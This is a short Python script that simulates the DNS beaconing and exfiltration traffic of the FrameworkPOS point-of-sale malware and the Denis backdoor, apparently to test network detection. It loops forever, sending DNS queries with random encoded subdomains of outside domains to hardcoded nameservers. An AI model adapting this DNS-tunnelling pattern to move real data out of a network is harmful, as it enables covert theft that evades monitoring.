
# # FrameworkPOS Simulation


def random_hexstr(length):
    import os,binascii
    return binascii.b2a_hex(os.urandom(length / 2))
  
def simulate_frameworkpos():
    from time import sleep
    import dns.resolver
    my_resolver = dns.resolver.Resolver()
    my_resolver.nameservers = ['23.216.52.9', '23.216.53.9']

    while True:
        domain = "{}.beacon.{}.{}.exfiltration.info.".format(
            random_hexstr(8),
            random_hexstr(26),
            random_hexstr(24))
        #print domain
        try:
            my_resolver.query(domain, 'A')
        except (dns.resolver.NXDOMAIN):
            pass

        sleep(0.3)
        
#simulate_frameworkpos()


# # Win32.Backdoor.Denis Simulation


def simulate_backdoor_denis():
    from time import sleep
    import random, string
    import dns.resolver
    my_resolver = dns.resolver.Resolver()
    my_resolver.nameservers = ['23.216.52.9', '23.216.53.9']
    logs = {}
    logs["success"] = 0
    logs["failure"] = 0
    n = 0

    while True:
        suffix = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(3))
        domain = "vL0VugAAAAAAAAAAAAAAAAAAAAAAAA{}.z.teriava.com.".format(suffix)
        try:
            my_resolver.query(domain, 'NULL')
            logs["success"] = logs["success"] + 1
        except (dns.resolver.NXDOMAIN):
            logs["success"] = logs["success"] + 1
        except (dns.resolver.NoNameservers):
            logs["failure"] = logs["failure"] + 1

        n += 1
        sleep(1.5)
        
        if (n%10 == 0):
            print logs
        
#simulate_backdoor_denis()





